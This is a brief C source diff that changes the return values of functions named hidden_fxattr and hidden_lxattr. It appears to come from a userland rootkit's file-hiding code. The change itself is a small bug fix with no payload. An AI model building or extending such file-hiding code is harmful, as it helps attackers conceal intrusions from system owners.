@@ -81,7 +81,7 @@ int hidden_fxattr(int fd)
 
     CLEAN(hidden_xattr_1_str);
     free(buf);
-    return 0;
+    return ret;
 }
 
 int hidden_lxattr(const char *filename)
@@ -114,7 +114,7 @@ int hidden_lxattr(const char *filename)
 
     CLEAN(hidden_xattr_1_str);
     free(buf);
-    return 0;
+    return ret;
 }
 
 int hidden_xstat(int ver, const char *filename, int mode)
